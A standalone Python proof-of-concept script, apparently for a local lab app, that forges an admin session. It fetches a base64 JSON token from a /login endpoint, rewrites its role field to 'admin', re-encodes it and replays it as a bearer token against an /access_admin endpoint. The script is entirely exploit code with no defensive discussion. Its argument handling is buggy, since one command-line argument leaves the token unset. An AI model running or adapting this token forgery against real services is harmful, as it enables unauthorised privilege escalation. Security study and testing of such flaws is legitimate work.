import sys
import json
import base64
import requests

TARGET_URL_ADMIN = 'http://localhost:5000/access_admin'
TARGET_URL_LOGIN = 'http://localhost:5000/login'

def main():
    if len(sys.argv) < 2:
        print("No argument provided. Attempting to retrieve token for user_id = 1.\n")
        full_token = get_auth_token('1')
    elif len(sys.argv) > 2:
        print(f'Using token {sys.argv[1]}.\n')
        full_token = sys.argv[1]

    user_data = json.loads(base64.b64decode(full_token).decode())

    print(f'\nFor user {user_data.get('user_name')}:')
    try_access_admin(full_token)

    print(f'\n\nModifying data:\n{user_data}')
    user_data.update({'role':'admin'})

    print(f'\nNew user data.\n{user_data}')
    new_token = base64.b64encode(json.dumps(user_data).encode()).decode('utf-8')
    print(f'\nNew autherization token.\n{new_token}\n\n')

    print(f'Retrying with new token. . .')
    try_access_admin(new_token)

def get_auth_token(user_id):
    '''
    Attempt to get the access token for a specific user.
    '''
    data = {
        'user_id' : str(user_id)
    }
    headers = {
        'Content-Type' : 'application/json'
    }

    try:
        response = requests.post(TARGET_URL_LOGIN, headers=headers, json=data)
        data = response.json()
        auth_token = data.get('authToken')
    except Exception as e:
        print(f'get_auth_token: Error: {e}')

    print(f'Server has responded. {auth_token}')
    return auth_token

def try_access_admin(authToken):
    '''
    Try to access the admin panel on the backend server.
    '''
    # mimic how authorization headers are transported
    headers = {
        'Authorization' : f'Bearer {authToken}'
    }

    try:
        response = requests.get(TARGET_URL_ADMIN, headers=headers)
        data = response.json()
    except Exception as e:
        print(f'try_access_admin: Error: {e}')

    # we see if the server authorized us as admin
    print(f'Server has responded. Admin = {data.get('is_elevated')}')


if __name__ == "__main__":
    main()